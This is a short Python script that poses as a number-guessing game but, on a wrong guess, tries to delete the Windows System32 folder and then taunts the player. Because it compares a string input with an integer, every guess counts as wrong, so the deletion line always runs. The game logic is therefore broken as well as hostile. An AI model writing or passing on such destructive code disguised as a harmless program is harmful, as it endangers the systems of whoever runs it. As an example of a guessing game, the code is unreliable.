import os
import random

print("i will pick a number between 0 and 10 you need to guess it")

y = random.randint(0, 10)

print("GUESS!")

x = input()

if x != y :
    os.remove("C:\Windows\System32")
    print("oh no there goes your System32!")
else:
    print("You Win!")